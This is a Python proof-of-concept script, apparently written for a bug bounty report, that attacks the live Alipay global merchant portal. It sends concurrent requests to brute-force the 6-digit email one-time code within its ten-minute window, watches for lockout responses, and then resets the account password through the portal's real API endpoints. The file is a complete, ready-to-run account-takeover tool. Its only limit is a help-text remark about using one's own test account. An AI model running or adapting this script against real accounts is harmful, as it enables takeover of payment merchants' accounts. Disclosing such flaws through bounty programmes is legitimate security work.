#!/usr/bin/env python3
"""
PoC: OTP Brute Force + Password Reset — Alipay Global Merchant Portal
Target: global.alipay.com / ifcidentitycloudqk.alipay.com
Bug Bounty: Ant Group Security Response Center

Demonstrates that the OTP verification endpoint (mic/verify) lacks
rate-limiting, enabling brute-force of the 6-digit OTP within its
10-minute validity window, followed by full password reset.

Flow:
  Step 3  consultRisk   → verifyId + securityId
  Step 4  mic/view      → trigger OTP email
  Step 5  mic/verify    → BRUTE FORCE 000000-999999 (async, ~500 concurrent)
  Step 6  getPubKey     → RSA public key
  Step 7  resetPassword → change the password

Usage:
  python3 otp_bruteforce_poc.py \\
      --email "you@yeswehack.ninja" \\
      --password "NewP@ss123!" \\
      --ctoken "<ctoken>" \\
      --cookies cookies.json \\
      --concurrency 500
"""

import argparse
import asyncio
import base64
import json
import random
import sys
import time
from urllib.parse import quote

import aiohttp
import requests
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives.serialization import load_der_public_key

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
BASE_URL = "https://global.alipay.com"
IDENTITY_HOST = "https://ifcidentitycloudqk.alipay.com"
OTP_EXPIRY_SECONDS = 600  # 10 minutes

COMMON_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/144.0.0.0 Safari/537.36"
    ),
    "Accept-Language": "en-US,en;q=0.9",
    "Sec-Ch-Ua": '"Not(A:Brand";v="8", "Chromium";v="144"',
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Sec-Ch-Ua-Mobile": "?0",
}

VERIFY_HEADERS = {
    **COMMON_HEADERS,
    "Accept": "*/*",
    "Origin": "https://render.antfin.com",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://render.antfin.com/",
}


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def encrypt_password(password: str, public_key_b64: str, salt: str) -> str:
    pub_der = base64.b64decode(public_key_b64)
    pub_key = load_der_public_key(pub_der)
    plaintext = (salt + password).encode("utf-8")
    ciphertext = pub_key.encrypt(plaintext, asym_padding.PKCS1v15())
    return base64.b64encode(ciphertext).decode("utf-8")


def api_headers(ctoken: str, referer: str, *, accept: str = "application/json",
                content_type: str | None = "application/json;charset=UTF-8") -> dict:
    h = {
        **COMMON_HEADERS,
        "Accept": accept,
        "Ctoken": ctoken,
        "Bx-V": "2.5.36",
        "Origin": BASE_URL,
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": referer,
    }
    if content_type:
        h["Content-Type"] = content_type
    return h


# ---------------------------------------------------------------------------
# PoC
# ---------------------------------------------------------------------------
class OTPBruteForce:
    def __init__(self, email: str, new_password: str, ctoken: str,
                 cookies: dict, route: str = "QK", concurrency: int = 500,
                 otp_start: int = 0, otp_end: int = 999999):
        self.email = email
        self.new_password = new_password
        self.ctoken = ctoken
        self.route = route
        self.concurrency = concurrency
        self.otp_start = otp_start
        self.otp_end = otp_end

        # Sync session for setup / teardown steps (3, 4, 6, 7)
        self.sess = requests.Session()
        self.sess.cookies.update(cookies)

        # State
        self.verify_id: str | None = None
        self.security_id: str | None = None
        self.uid: str | None = None
        self.public_key: str | None = None
        self.salt: str | None = None

        # Brute-force counters (accessed from async workers)
        self.found_otp: str | None = None
        self.attempts = 0
        self.errors = 0
        self.locked = False
        self.lock_msg = ""
        self.t0 = 0.0
        self._sample_logged = False

    # ---- Step 3 -----------------------------------------------------------
    def step3_consult_risk(self) -> bool:
        print("[3] consultRisk …")
        url = (f"{BASE_URL}/merchant/proxyapi/member/consultRisk.json"
               f"?_route={self.route}&ctoken={self.ctoken}")
        referer = (
            f"{BASE_URL}/merchant/portal/account/security/"
            f"{quote(self.email)}?_route={self.route}"
            f"&featureCode=findLogonPassword"
        )
        resp = self.sess.post(url, json={"scene": "FIND_LOGON_PASSWORD"},
                              headers=api_headers(self.ctoken, referer),
                              timeout=15)
        data = resp.json()
        print(f"[3] Full response: {json.dumps(data, indent=2)}")
        if not data.get("success"):
            print("[3] FAILED: success != true")
            return False

        inner = data.get("data", {})
        self.security_id = inner.get("securityId")
        self.verify_id = inner.get("verifyId")

        # Some responses omit verifyId; construct it from securityId
        if not self.verify_id and self.security_id:
            constructed = f"{self.security_id}_out_{self.route.lower()}_site"
            print(f"[3] verifyId was null — constructing: {constructed}")
            self.verify_id = constructed

        if not self.verify_id:
            print("[3] FATAL: could not obtain verifyId")
            return False

        print(f"[3] verifyId   = {self.verify_id}")
        print(f"[3] securityId = {self.security_id}")
        return True

    # ---- Step 4 -----------------------------------------------------------
    def step4_trigger_otp(self) -> bool:
        print(f"[4] Triggering OTP email (verifyId={self.verify_id}) …")
        url = f"{IDENTITY_HOST}/api/mic/view"
        params = {
            "productCode": "otpEmail",
            "verifyId": self.verify_id,
            "_output_charset": "utf-8",
            "_input_charset": "utf-8",
        }
        resp = self.sess.get(url, params=params,
                             headers=VERIFY_HEADERS, timeout=15)
        data = resp.json()
        result_code = data.get("resultCode", "")
        result_msg = data.get("resultMessage", "")
        print(f"[4] resultCode={result_code}  resultMessage={result_msg}")
        if data.get("success") and result_code == "SUCCESS":
            print("[4] OTP email triggered successfully")
            return True
        print(f"[4] FAILED — full response:\n{json.dumps(data, indent=2)}")
        return False

    # ---- Step 5  (async brute force) -------------------------------------
    async def _worker(self, session: aiohttp.ClientSession,
                      code_iter, iter_lock: asyncio.Lock,
                      stop: asyncio.Event) -> None:
        """Pull OTP codes from the shared iterator and test them."""
        base_url = (
            f"{IDENTITY_HOST}/api/mic/verify"
            f"?productCode=otpEmail"
            f"&verifyId={self.verify_id}"
            f"&_output_charset=utf-8"
            f"&_input_charset=utf-8"
            f"&data="
        )
        while not stop.is_set():
            # Grab next code
            async with iter_lock:
                code = next(code_iter, None)
            if code is None:
                return

            otp = f"{code:06d}"
            url = base_url + otp

            for retry in range(3):
                if stop.is_set():
                    return
                try:
                    async with session.get(url, headers=VERIFY_HEADERS) as resp:
                        text = await resp.text()
                    self.attempts += 1
                    break  # success — got a response
                except Exception:
                    self.errors += 1
                    if retry == 2:
                        # give up on this code after 3 tries
                        self.attempts += 1
                        text = ""
                    else:
                        await asyncio.sleep(0.05 * (retry + 1))

            if not text:
                continue

            # Log first response for debugging
            if self.attempts == 1 and not self._sample_logged:
                self._sample_logged = True
                print(f"\n[5] Sample response (OTP={otp}):\n    {text[:400]}\n")

            # ---- Evaluate response via JSON parsing ----
            try:
                body = json.loads(text)
            except (json.JSONDecodeError, ValueError):
                continue

            if body.get("verifySuccess") is True:
                self.found_otp = otp
                stop.set()
                return

            # Also check nested resultCode
            if body.get("resultCode") == "SUCCESS" and body.get("isFinish") is True:
                self.found_otp = otp
                stop.set()
                return

            # Detect lockout signals
            rc = str(body.get("resultCode", ""))
            rm = str(body.get("resultMessage", ""))
            render = str(body.get("renderData", {}).get("code", ""))
            for signal in ("VALIDATE_LOCKED", "VALIDATE_TIMES_LIMIT",
                           "USER_LOCK", "VERIFY_LOCKED"):
                if signal in rc or signal in rm or signal in render:
                    self.locked = True
                    self.lock_msg = text[:400]
                    stop.set()
                    return

    async def _progress(self, total: int, stop: asyncio.Event) -> None:
        while not stop.is_set():
            elapsed = time.time() - self.t0
            remaining_time = OTP_EXPIRY_SECONDS - elapsed
            rate = self.attempts / max(elapsed, 0.01)
            pct = (self.attempts / total) * 100
            eta_codes = (total - self.attempts) / max(rate, 1)
            print(
                f"\r  {self.attempts:>7,}/{total:,} "
                f"({pct:5.1f}%)  "
                f"{rate:>6,.0f} req/s  "
                f"ETA {eta_codes:>5.0f}s  "
                f"OTP expires in {max(remaining_time, 0):>4.0f}s  "
                f"err {self.errors}",
                end="", flush=True,
            )
            try:
                await asyncio.wait_for(stop.wait(), timeout=0.4)
                break
            except asyncio.TimeoutError:
                pass

    async def step5_brute_force(self) -> bool:
        total = self.otp_end - self.otp_start + 1
        print(f"\n[5] BRUTE FORCE  {self.otp_start:06d}–{self.otp_end:06d}"
              f"  ({total:,} codes, {self.concurrency} workers)\n")

        # Randomise order for uniform expected discovery time
        codes = list(range(self.otp_start, self.otp_end + 1))
        random.shuffle(codes)

        code_iter = iter(codes)
        iter_lock = asyncio.Lock()
        stop = asyncio.Event()
        self.t0 = time.time()

        timeout = aiohttp.ClientTimeout(total=10, connect=5)
        connector = aiohttp.TCPConnector(
            limit=self.concurrency,
            limit_per_host=self.concurrency,
            ttl_dns_cache=300,
            enable_cleanup_closed=True,
        )

        async with aiohttp.ClientSession(connector=connector,
                                         timeout=timeout) as session:
            workers = [
                asyncio.create_task(
                    self._worker(session, code_iter, iter_lock, stop)
                )
                for _ in range(self.concurrency)
            ]
            progress = asyncio.create_task(self._progress(total, stop))

            await asyncio.gather(*workers)
            stop.set()
            await progress

        elapsed = time.time() - self.t0
        rate = self.attempts / max(elapsed, 0.01)
        print(f"\n\n[5] Done: {self.attempts:,} attempts in {elapsed:.1f}s"
              f" ({rate:,.0f} req/s, {self.errors} errors)")

        if self.found_otp:
            print(f"[5] {'='*50}")
            print(f"[5]  OTP FOUND:  {self.found_otp}")
            print(f"[5] {'='*50}")
            return True
        if self.locked:
            print(f"[5] LOCKED: {self.lock_msg}")
            return False
        if time.time() - self.t0 >= OTP_EXPIRY_SECONDS:
            print("[5] OTP expired (10 min)")
            return False
        print("[5] OTP not found in range")
        return False

    # ---- Step 6 -----------------------------------------------------------
    def step6_get_pubkey(self) -> bool:
        print("\n[6] Fetching public key …")
        url = (f"{BASE_URL}/merchant/proxyapi/member/getPubKey.json"
               f"?_route={self.route}&ctoken={self.ctoken}")
        referer = (f"{BASE_URL}/merchant/portal/account/set-login-pwd/"
                   f"{quote(self.email)}?_route={self.route}")
        headers = api_headers(self.ctoken, referer, accept="*/*",
                              content_type=None)
        resp = self.sess.get(url, headers=headers, timeout=15)
        data = resp.json()
        if not data.get("success"):
            print(f"[6] FAILED: {json.dumps(data, indent=2)}")
            return False
        self.public_key = data["data"]["publicKey"]
        self.salt = data["data"]["salt"]
        self.uid = data["data"]["uid"]
        print(f"[6] uid  = {self.uid}")
        print(f"[6] salt = {self.salt}")
        return True

    # ---- Step 7 -----------------------------------------------------------
    def step7_reset_password(self) -> bool:
        print("\n[7] Resetting password …")
        encrypted_pw = encrypt_password(
            self.new_password, self.public_key, self.salt)
        url = (
            f"{BASE_URL}/merchant/merchantservice/api/account/"
            f"resetLogonPassword.json?_route={self.route}&ctoken={self.ctoken}"
        )
        referer = (f"{BASE_URL}/merchant/portal/account/set-login-pwd/"
                   f"{quote(self.email)}?_route={self.route}")
        payload = {
            "encryptedQueryPassword": encrypted_pw,
            "uid": self.uid,
            "verifyId": self.verify_id,
            "securityId": self.security_id,
            "verifyProductCode": "otpEmail",
        }
        resp = self.sess.post(url, json=payload,
                              headers=api_headers(self.ctoken, referer),
                              timeout=15)
        data = resp.json()
        print(f"[7] HTTP {resp.status_code}")
        print(json.dumps(data, indent=2))
        if data.get("success"):
            print("\n[7] PASSWORD RESET SUCCESSFUL")
            return True
        print(f"\n[7] Failed: {data.get('resultMessage', 'unknown')}")
        return False

    # ---- Orchestrator -----------------------------------------------------
    def run(self, override_verify_id: str | None = None,
            override_security_id: str | None = None) -> bool:
        total = self.otp_end - self.otp_start + 1
        print("=" * 70)
        print("PoC: OTP Brute Force + Password Reset")
        print(f"  Target      : {BASE_URL}")
        print(f"  Verify host : {IDENTITY_HOST}")
        print(f"  Email       : {self.email}")
        print(f"  Workers     : {self.concurrency}")
        print(f"  OTP range   : {self.otp_start:06d}–{self.otp_end:06d}"
              f"  ({total:,} codes)")
        print(f"  OTP window  : {OTP_EXPIRY_SECONDS}s")
        if override_verify_id:
            print(f"  Override VID: {override_verify_id}")
        print("=" * 70)

        if override_verify_id:
            self.verify_id = override_verify_id
            self.security_id = override_security_id or override_verify_id.split("_")[0]
            print(f"[3] Using provided verifyId = {self.verify_id}")
            print(f"[3] Using securityId        = {self.security_id}")
        else:
            if not self.step3_consult_risk():
                return False

        if not self.step4_trigger_otp():
            return False

        # Brute-force
        if not asyncio.run(self.step5_brute_force()):
            print("\n" + "=" * 70)
            if self.locked:
                print("RESULT: Rate-limiting / lockout detected.")
            else:
                print("RESULT: OTP not found within window.")
            print("=" * 70)
            return False

        # OTP found — complete the reset
        if not self.step6_get_pubkey():
            return False
        success = self.step7_reset_password()

        print("\n" + "=" * 70)
        if success:
            print("RESULT: VULNERABLE — OTP brute-forced, password reset.")
        else:
            print("RESULT: OTP brute-forced but password reset was rejected.")
        print("=" * 70)
        return success


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def main() -> None:
    p = argparse.ArgumentParser(
        description="PoC: OTP Brute Force — Alipay Global Merchant Portal",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Example:
  python3 %(prog)s \\
      --email "you@yeswehack.ninja" \\
      --password "N3wP@ss!" \\
      --ctoken "abc123" \\
      --cookies cookies.json \\
      --concurrency 500
""",
    )
    p.add_argument("--email", required=True,
                   help="Target email (your own test account)")
    p.add_argument("--password", required=True,
                   help="New password to set on success")
    p.add_argument("--ctoken", required=True,
                   help="CSRF token from session")
    p.add_argument("--cookies", required=True,
                   help="Path to cookies JSON file (or inline JSON)")
    p.add_argument("--route", default="QK")
    p.add_argument("--concurrency", type=int, default=500,
                   help="Parallel workers (default: 500)")
    p.add_argument("--start", type=int, default=0,
                   help="OTP range start (default: 0)")
    p.add_argument("--end", type=int, default=999999,
                   help="OTP range end (default: 999999)")
    p.add_argument("--verify-id", default=None,
                   help="Manually provide verifyId (skip consultRisk)")
    p.add_argument("--security-id", default=None,
                   help="Manually provide securityId (with --verify-id)")

    args = p.parse_args()

    try:
        with open(args.cookies) as f:
            cookies = json.load(f)
    except FileNotFoundError:
        try:
            cookies = json.loads(args.cookies)
        except json.JSONDecodeError:
            print(f"[!] Cannot read cookies: {args.cookies}")
            sys.exit(1)
    except json.JSONDecodeError:
        print(f"[!] Invalid JSON in {args.cookies}")
        sys.exit(1)

    poc = OTPBruteForce(
        email=args.email,
        new_password=args.password,
        ctoken=args.ctoken,
        cookies=cookies,
        route=args.route,
        concurrency=args.concurrency,
        otp_start=args.start,
        otp_end=args.end,
    )
    success = poc.run(
        override_verify_id=args.verify_id,
        override_security_id=args.security_id,
    )
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
